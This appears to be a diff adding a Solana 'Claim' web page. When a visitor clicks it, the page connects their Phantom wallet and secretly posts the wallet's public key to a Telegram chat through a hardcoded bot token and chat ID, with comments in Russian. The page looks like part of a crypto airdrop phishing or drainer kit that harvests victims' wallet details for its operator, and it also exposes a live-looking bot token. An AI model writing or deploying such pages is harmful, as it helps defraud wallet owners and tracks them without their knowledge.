@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Solana Wallet Connect</title>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.10.0/dist/web3.min.js"></script>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <button id="connectWallet">Claim</button>
+
+  <script>
+    const telegramBotToken = "7826785273:AAGi1Tpb1sekJN1DvjPCwTBRpQIcqGwiOZw"; // Вставьте токен вашего бота
+    const telegramChatId = "-4600963126"; // Вставьте ID чата, куда отправлять сообщения
+
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+      const response = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: telegramChatId, text: message })
+      });
+
+      if (!response.ok) {
+        alert("Ошибка отправки данных в Telegram.");
+      }
+    }
+
+    async function connectWallet() {
+      try {
+        if (!window.solana) {
+          alert("Убедитесь, что у вас установлен Phantom Wallet.");
+          return;
+        }
+
+        const resp = await window.solana.connect(); // Запрос подключения кошелька
+        const publicKey = resp.publicKey.toString();
+        alert(`Кошелек подключен: ${publicKey}`);
+
+        // Отправляем публичный ключ кошелька в Telegram
+        await sendToTelegram(`Публичный ключ кошелька: ${publicKey}`);
+      } catch (err) {
+        console.error("Ошибка подключения кошелька:", err);
+        alert("Не удалось подключить кошелек.");
+      }
+    }
+
+    document.getElementById("connectWallet").addEventListener("click", connectWallet);
+  </script>
+</body>
+</html>
